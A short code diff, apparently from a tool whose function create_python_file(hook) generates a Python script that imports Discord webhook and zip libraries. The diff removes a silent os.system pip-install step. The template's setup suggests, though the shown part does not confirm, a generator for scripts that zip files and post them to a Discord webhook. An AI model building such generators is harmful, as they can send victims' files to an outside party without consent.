@@ -5,20 +5,6 @@ def create_python_file(hook):
     template = f"""
 import os
 import time
-
-# depencies check
-home = os.path.expanduser('~')
-discord_path = os.path.join(home, 'AppData\\Local\\Packages\\PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0\\LocalCache\\local-packages\\Python311\\site-packages\\discord_webhook')
-discord_status = os.path.isdir(discord_path)
-
-for i in range(1):
-    if discord_status == True:
-        continue
-    else:
-        os.system("pip install discord_webhook zip_files shutil")
-# depencies check end
-
-# sources
 from discord_webhook import DiscordWebhook, DiscordEmbed
 from zipfile import ZipFile, ZIP_DEFLATED
 import zipfile
